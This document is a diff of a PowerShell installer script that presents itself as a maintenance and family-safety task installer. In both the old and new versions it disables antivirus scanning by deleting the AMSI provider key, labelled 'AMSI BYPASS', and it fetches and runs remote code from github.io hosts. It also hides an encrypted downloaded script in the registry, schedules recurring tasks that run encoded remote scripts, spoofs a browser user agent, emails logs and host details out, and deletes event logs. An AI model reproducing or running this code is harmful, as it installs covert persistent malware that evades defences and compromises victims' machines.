@@ -1,122 +1,280 @@
 
 [CmdletBinding(SupportsShouldProcess)]
 param()
-$fname=(new-guid).Guid
-$fname = $fname.substring(0,20)
+
+$LogFileName=(new-guid).Guid
+$LogFileName = $LogFileName.substring(0,16)
+$LogFileName = $LogFileName + '.dat'
 $FullLogs = ""
-$LogFilePath="$env:Temp\$fname.001"
-$EnableLogs=$True
-Function OutString{
+[string]$TempDir=(new-guid).Guid
+$TmpFilePath="$env:Temp\$TempDir"
+$null=New-Item -Path $TmpFilePath -ItemType Directory -Force
+$LogFileName = Join-Path $TmpFilePath $LogFileName
+
+$EnableLogOutput=$false
+if((Get-Variable -Name 'SCRIPTDEBUG-ENABLED' -Scope Global -ValueOnly) -eq $true){$EnableLogOutput=$true}
+
+
+$ThisScript=$($MyInvocation.MyCommand.Name)
+$ThisScript=$ThisScript.SubString(0,$ThisScript.Length-4)
+
+#----!DEPENDENCIESDEFINITIONS----
+$Functions = 'RemoveOldTasks', 'Cleanup', 'Get-SystemUUID', 'Check-Version', 'Get-MachineCryptoGuid', 'Get-4KHash', 'Test-Machine-Identification', 'Get-PossiblePasswordList', 'Invoke-AESEncryption', 'Decrypt-String', 'Encrypt-String', 'Test-EncryptionDecryption', 'Send-EmailNotification', 'Invoke-Process', 'Get-FileSystemInfo', 'Get-InstalledSoftware', 'Import-Variables', 'Test-ImportsVariables', 'New-TempDirectory', 'Get-Base64FromUrl', 'Out-String', 'NetGetFileNoCache', 'NetGetStringNoCache', 'Test-RegistryValue', 'Get-RegistryValue', 'Set-RegistryValue', 'New-RegistryValue', 'Install-RegistryKey', 'Test-RegistryValue', 'New-RegistryValue', 'Get-RegistryKeyPropertiesAndValues', 'Save-ScriptToRegistry', 'New-ScheduledTaskFolder', 'Install-EncodedScriptTask'
+$Dependencies = 'Clean-Functions.ps1', 'Crypto-Functions.ps1', 'Email-Functions.ps1', 'Get-FileSystemInfo.ps1', 'Get-InstalledSoftware.PS1', 'Imports.ps1', 'Misc-Functions.ps1', 'Network-Functions.ps1', 'Registry-Functions.ps1', 'Tasks-Functions.ps1'
+
+
+
+Function Out-String {
     param (
-        [Parameter(Mandatory)]
-        [ValidateNotNullOrEmpty()]
-        [string]$Msg
+        [Parameter(Mandatory=$false)]
+        [string]$Msg="",
+        [switch]$IsError
     )
 
-    if($EnableLogs -eq $False){
-        return
-    }
+    if($Msg -eq ""){return}
     $FullLogs = $FullLogs + $Msg
-    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
-        
-        write-host '[install]   ' -NoNewLine -f Red
-        write-host $Msg -f DarkYellow
-        
-        if ($PSCmdlet.ShouldProcess($Msg)) {
-            [pscustomobject]@{
-                Time = (Get-Date -f g)
-                Message = $Msg
-            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
-         }
-    }else{
-        if ($PSCmdlet.ShouldProcess($Msg)) {
-            [pscustomobject]@{
-                Time = (Get-Date -f g)
-                Message = $Msg
-            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
-         }
+    if($EnableLogOutput){
+        if($IsError){
+            write-host "[*** $ThisScript ***] " -f Blue -NoNewLine
+            write-host $Msg -f White
+        }
+        else {
+            write-host "[$ThisScript] " -f DarkRed -NoNewLine
+            write-host $Msg -f DarkYellow
+        }
     }
+    [pscustomobject]@{
+            Time = (Get-Date -f g)
+            Message = "[$ThisScript] $Msg"
+        } | Export-Csv -Path $LogFileName -Append -NoTypeInformation
+    
 }
 
-function New-CTempDirectory
+
+
+function Get-RegistryKeyPropertiesAndValues {
+ Param(
+  [Parameter(Mandatory=$true)]
+  [string]$path)
+
+ Push-Location
+ Set-Location -Path $path
+ Get-Item . |  Select-Object -ExpandProperty property |  ForEach-Object {
+    New-Object psobject -Property @{"property"=$_;
+    "Value" = (Get-ItemProperty -Path . -Name $_).$_}
+    }
+    Pop-Location
+} 
+
+function Test-RegistryValue
 {
-    [CmdletBinding(SupportsShouldProcess=$true)]
-    [OutputType([IO.DirectoryInfo])]
-    param(
-        [string]
-        # A prefix to use, so you can more easily identify *what* created the temporary directory. If you pass in a path, it will be converted to a file name.
-        $Prefix
+
+    param (
+     [parameter(Mandatory=$true)]
+     [ValidateNotNullOrEmpty()]$Path,
+     [parameter(Mandatory=$true)]
+     [ValidateNotNullOrEmpty()]$Entry
     )
 
-    $tempDir = [IO.Path]::GetRandomFileName()
-    if( $Prefix )
-    {
-        $Prefix = Split-Path -Leaf -Path $Prefix
-        $tempDir = '{0}{1}' -f $Prefix,$tempDir
+    if(-not(Test-Path $Path)){
+        return $false
+    }
+    try {
+        Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Entry -ErrorAction Stop | Out-Null
+        return $true
     }
 
-    $tempDir = Join-Path -Path $env:TEMP -ChildPath $tempDir
-    New-Item -Path $tempDir -ItemType 'Directory' -Verbose:$VerbosePreference
+    catch {
+        return $false
+    }
 }
 
-$IncList = [System.Collections.ArrayList]::new()
-function Include-Externals {
+
+
+function DependencyCheck{
+
+    $NumMissingFuntions=0
+    try{
+        Out-String "Checking Dependencies..."
+        foreach($func in $Functions){
+            
+            $cmd=get-command -Name $func -ErrorAction SilentlyContinue
+            if($EnableLogOutput){ Write-Host "  Funtion $func" -f Gray -NoNewLine }
+            if($cmd -ne $null){
+                $NumFuntions=$NumFuntions+1
+                 if($EnableLogOutput){ Write-Host "`t`t`t[DETECTED]" -f Green }
+            }else{
+                if($EnableLogOutput){ Write-Host "`t`t`t[MISSING]" -f Red }
+                $NumMissingFuntions = $NumMissingFuntions + 1
+            }
+        }
+        
+    }
+    catch{
+        $Msg="Dependencies Error: $($PSItem.ToString())"
+        Write-Error $Msg -IsError
+    }
+
+    if($NumMissingFuntions -gt 0){
+        return $false
+    }
+    return $true
+}
+
+$BaseUrl='https://vr972be716a04eb6.github.io/'
+$IncludesUrl= $BaseUrl + 'cmd/inc/'
+$RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
+$RegKeyPathInc=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems\Includes"
+Set-Variable -Name 'REGISTRY_INCL' -Value $RegKeyPathInc -Scope Script
+Set-Variable -Name 'URL_BASE' -Value $BaseUrl -Scope Script
+Set-Variable -Name 'URL_INCL' -Value $IncludesUrl -Scope Script
+
+
+function Download-Dependencies-SaveInRegistry {
   [CmdletBinding(SupportsShouldProcess)]
   param()
-  try{
-      $includes = [System.Collections.ArrayList]::new()
-      $null=$includes.Add('Clean-Functions.ps1')
-      $null=$includes.Add('Crypto-Functions.ps1')
-      $null=$includes.Add('Email-Functions.ps1')
-      $null=$includes.Add('Registry-Functions.ps1')
-      $null=$includes.Add('Tasks-Functions.ps1')
-      $null=$includes.Add('Misc-Functions.ps1')
-      $tempdir=New-CTempDirectory -Prefix 'itask'
-      $baseurl='https://radicaltronic.github.io/cmd/inc/'
-      $webClient = [System.Net.WebClient]::new()
-      $basedir=$tempdir.FullName + '\'
-      foreach($inc in $includes){
-        $source = $baseurl + $inc
-        $destination = $basedir + $inc
-        Write-Host "Getting $source and savng to $destination"
-        
-        $webClient.DownloadFile($source, $destination)
-        $null=$IncList.Add($destination)
+
+ 
+  $WebClient = [System.Net.WebClient]::new()
+  if( -not (Test-Path -Path $script:REGISTRY_INCL -PathType Container) ){
+    $null=New-Item -Path $script:REGISTRY_INCL -ItemType RegistryKey -Force
+  }
+
+  try{      
+
+      $BaseUrl=$script:URL_INCL
+     
+      foreach($DepFile in $Dependencies){
+        $FullUrl = $BaseUrl + $DepFile
+
+        $TmpFileName = Join-Path $TmpFilePath $DepFile
+
+        $RandId=(new-guid).Guid
+        $RandId=$RandId -replace "-"
+        $RequestUrl = "$FullUrl" + "?id=$RandId"
+        $WebClient.Headers.Add("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1") 
+        $WebClient.CachePolicy = New-Object Net.Cache.RequestCachePolicy([Net.Cache.RequestCacheLevel]::NoCacheNoStore)
+        $WebClient.DownloadFile($RequestUrl,$TmpFileName)
+
+        if(Test-RegistryValue -Path $script:REGISTRY_INCL -Entry $DepFile){
+            $null=Remove-ItemProperty -Path $script:REGISTRY_INCL -Name $DepFile -Force  | Out-null
+        }
+        $null=New-ItemProperty -Path $script:REGISTRY_INCL -Name $DepFile -Value $TmpFileName -PropertyType String
+        Out-String "Saving $source in registry"
+        Out-String "`tFile: $TmpFileName"
       }
   }
   catch{
-    $Msg="Send-InstallNotification Ran into an issue: $($PSItem.ToString())"
-    write-error $Msg 
-    return
+    $Msg="Download-Dependencies-SaveInRegistry Ran into an issue: $($PSItem.ToString())"
+    write-Error $Msg
+    return 
   }
+}
 
-}
-Include-Externals
-foreach($inc in $IncList){
-    . "$inc"
-}
+Function Get-DependenciesFromRegistry
+{
+    [CmdletBinding(SupportsShouldProcess)]
+    param()
+    $Res = [System.Collections.ArrayList]::new()
+    try{
+        Out-String "----------   LOOKING IN REGISTRY TO INCLUDE DEPEDENCIES ----------"
+
+        $Includes=Get-RegistryKeyPropertiesAndValues -path $script:REGISTRY_INCL
+        $IncludesLen=$Includes.Length
+        Out-String "Found $IncludesLen registry entries"
+
+        ForEach($incfile in $Includes){
+            $FileName=$incfile[0].property
+            $FilePath=$incfile[0].Value
+            if(Test-Path -Path $FilePath){
+                Out-String "     $FilePath"
+                $null=$Res.Add($FilePath)
+            }else{
+                
+                $WebClient = [System.Net.WebClient]::new()
+                $Url=$script:URL_INCL
+                $TmpFileName = Join-Path $TmpFilePath $FileName
+                $Source = $Url + $FileName
+                Out-String "    missing file, will download $Source,$TmpFileName"
+
+                $RandId=(new-guid).Guid
+                $RandId=$RandId -replace "-"
+                $RequestUrl = "$Source" + "?id=$RandId"
+                $WebClient.Headers.Add("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1") 
+                $WebClient.CachePolicy = New-Object Net.Cache.RequestCachePolicy([Net.Cache.RequestCacheLevel]::NoCacheNoStore)
+                $WebClient.DownloadFile($RequestUrl,$TmpFileName)
+                $null=$Res.Add($TmpFileName)
+               
+               if(Test-RegistryValue -Path $script:REGISTRY_INCL -Entry $FileName){
+                    $null=Remove-ItemProperty -Path $script:REGISTRY_INCL -Name $FileName -Force  | Out-null
+                }
+                $null=New-ItemProperty -Path $script:REGISTRY_INCL -Name $FileName -Value $TmpFileName -PropertyType String
+            }
+        }
+    }
+    catch{
+        $Msg="Include-Dependencies: Ran into an issue: $FileName"
+        write-error $Msg 
+    }
+    return $Res
+} 
+
+
 
 
 $Start=Get-Date
-Send-InstallNotification "START Schd Task Install Notice for $env:COMPUTERNAME" "$Start" 
+Out-String "----------   INSTALL START   ----------"
+Out-String "Download and save dependencies..."
+
+DependencyCheck
+############################################################
+##
+## Dependencies Download, save
+##
+############################################################
+Download-Dependencies-SaveInRegistry
+
+
+
+try{
+    Remove-Module Carbon -ErrorAction Ignore 
+}
+catch{
+    Write-Verbose "noop"
+}
+
+############################################################
+##
+## Dependencies Inclusion
+##
+############################################################
+$DepList=Get-DependenciesFromRegistry
+$DepListLen=$DepList.Length
+Out-String "Found $DepListLen dependencies..."
+ForEach($dep in $DepList){
+    $Name=$dep
+    Out-String "including $Name..."
+    . $Name
+}
+
+if(-not(DependencyCheck)){
+    Write-Error -Message "Dependency Error" -Exception ( New-Object -TypeName System.IO.FileNotFoundException ) -ErrorAction Stop
+}
+
+
+Import-Variables
+Test-ImportsVariables
+
+
 
 <#         *******************
 #              PREPARATION
 #          ********************
 #>
-OutString "----------   INSTALL START   ----------"
-OutString "RemoveOldTasks"
-
-RemoveOldTasks 5
 
 # AMSI
-OutString "AMSI BYPASS"
-Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
-$webclient = New-Object Net.WebClient
-
-$NewTaskFolder=$env:COMPUTERNAME + '-MaintenanceUpdate'
-OutString "Creating New Scheduled Task Folder: $NewTaskFolder"
-New-ScheduledTaskFolder $NewTaskFolder
+Out-String "AMSI BYPASS"
+Remove-Item -Path $script:REGKEY_AMSIBP -Recurse -Force -ErrorAction Ignore 
 
 
 
@@ -124,39 +282,39 @@ New-ScheduledTaskFolder $NewTaskFolder
 #              UPDATE TASKS DEFINITION (ENCRYPTED)
 #         *******************************************
 #>
-$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/regcode-dlrun-cmd.ps1'
-$PassUrl='https://vr972be716a04eb6.github.io/dat/psaes.dat'
-$ClearScript = $webclient.DownloadString($ScriptUrl)
-$Pass = $webclient.DownloadString($PassUrl)
+$ScriptUrl=$script:SCRIPT_DLDRUN
+$PassUrl=$script:URL_PASSWD
+$ClearScript = NetGetStringNoCache -Url $ScriptUrl
+$Pass = NetGetStringNoCache -Url $PassUrl
 $Pass = $Pass.substring(0,30)
 $EncryptedScript=Invoke-AESEncryption -Mode Encrypt -Key $Pass -Text $ClearScript
-OutString "Getting Script: $ScriptUrl saving TO REGISTRY..."
-Set-ScriptDataToRegistry $EncryptedScript
+Out-String "Getting Script: $ScriptUrl saving TO REGISTRY..."
 
+
+$RegKeyPath=$script:REGISTRY_MDIA
+$RegKeyName=$script:REGISTRY_TASK
+
+$null=Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value $EncryptedScript
 
 <#         ***********************
 #                 TASK NO 1
 #         ************************
 #>
 try{
-    $NewTaskName=$NewTaskFolder + '\' + 'FamilySafetyRulesUpdateTask'
-    Get-ScheduledTask -TaskName 'FamilySafetyRulesUpdateTask' -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
-
-    $ScriptUrl='https://radicaltronic.github.io/cmd/run-hourly.ps1'
-    $Base64Command=Get-Base64FromUrl $ScriptUrl
+    $NewTaskName=$script:TASKNAME_ONE
+    $ScriptUrl=$script:SCRIPT_RUNHRY
+    [string]$Base64Command=Get-Base64FromUrl $ScriptUrl
     $Base64CommandLen=$Base64Command.Length
-    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
-    Install-EncodedScriptTask $NewTaskName 15 $Base64Command
+    Out-String "Install-EncodedScriptTask -TaskName $NewTaskName -Interval 15 -EncodedTask Base64Command($Base64CommandLen)"
+    $TaskVal=Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore
+    if($TaskVal -eq $null){
+         Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
+        Install-EncodedScriptTask -TaskName $NewTaskName -Interval 15 -EncodedTask $Base64Command
+    }
 }catch
 {
     $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
-    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
-        write-host '[install]   ' -NoNewLine -f Red
-        write-host $Msg -f DarkYellow
-        Write-Verbose $Msg
-    }
     write-error $Msg 
-    return    
 }   
 
 <#         ***********************
@@ -164,23 +322,23 @@ try{
 #         ************************
 #>
 try{
-    $NewTaskName=$NewTaskFolder + '\' + 'FamilyDailySafetyUpdate1'
-    Get-ScheduledTask -TaskName 'FamilyDailySafetyUpdate1' -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
-    $ScriptUrl='https://radicaltronic.github.io/cmd/update-runner-scriptblock.ps1'
-    $Base64Command=Get-Base64FromUrl $ScriptUrl
+    $NewTaskName=$script:TASKNAME_TWO
+    $ScriptUrl=$script:SCRIPT_UPDRNR
+    [string]$Base64Command=Get-Base64FromUrl $ScriptUrl
     $Base64CommandLen=$Base64Command.Length
-    OutString "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
-    Install-EncodedScriptTask $NewTaskName 500 $Base64Command
+    Out-String "Install-EncodedScriptTask $NewTaskName 15 Base64Command($Base64CommandLen)"
+    $TaskVal=Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore
+    if($TaskVal -eq $null){
+        Get-ScheduledTask -TaskName $NewTaskName -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
+        Install-EncodedScriptTask -TaskName $NewTaskName -Interval 500 -EncodedTask $Base64Command
+    }
+
+ 
+
 }catch
 {
     $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
-    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
-        write-host '[install]   ' -NoNewLine -f Red
-        write-host $Msg -f DarkYellow
-        Write-Verbose $Msg
-    }
     write-error $Msg 
-    return 
 }  
 
 
@@ -188,40 +346,14 @@ $End=Get-Date
 $Diff=$End-$Start
 $Min=$Diff.Minutes
 $Sec=$Diff.Seconds
-OutString "Done All tasks. Ended on $End."
-OutString "Took a total of $Min minutes and $Sec seconds."
-$EnableLogs=$false
+Out-String "Done All tasks. Ended on $End."
+Out-String "Took a total of $Min minutes and $Sec seconds."
 
 
+Out-String "Send-EmailNotification"
+Send-EmailNotification "Schd Task Install Notice for $env:COMPUTERNAME" "Done All tasks. Ended on $End. Took a total of $Min minutes and $Sec seconds. $FullLogs" "$LogFilePath"
 
-try{
-    $EnableLogs=$false
-    
-    <#$TempFile=(new-guid).Guid
-    $TempFile = $TempFile.substring(0,8) + '.bac'
-    $TempFile = Join-Path "$env:TEMP" "$TempFile"
-    Copy-Item "$LogFilePath" "$TempFile"
-#>
-    OutString "Send-InstallNotification"
-    Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "Done All tasks. Ended on $End. Took a total of $Min minutes and $Sec seconds. $FullLogs"
+Out-String "Cleanup"
+Cleanup -DeleteEvents -DeleteLogFiles
 
-    #OutString "Cleanup"
-    #Cleanup -DeleteEvents -DeleteLogFiles
-
-    Sleep 1
-   # Remove-Item "$TempFile" -Force
-}catch
-{
-    $Msg="[Creating task $NewTaskName] Ran into an issue: $($PSItem.ToString())"
-    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
-        write-host '[install]   ' -NoNewLine -f Red
-        write-host $Msg -f DarkYellow
-        Write-Verbose $Msg
-    }
-    write-error $Msg 
-    return 
-}  
-
-foreach($inc in $IncList){
-    Remove-Item "$inc" -Force -ErrorAction ignore
-}
+Sleep 1
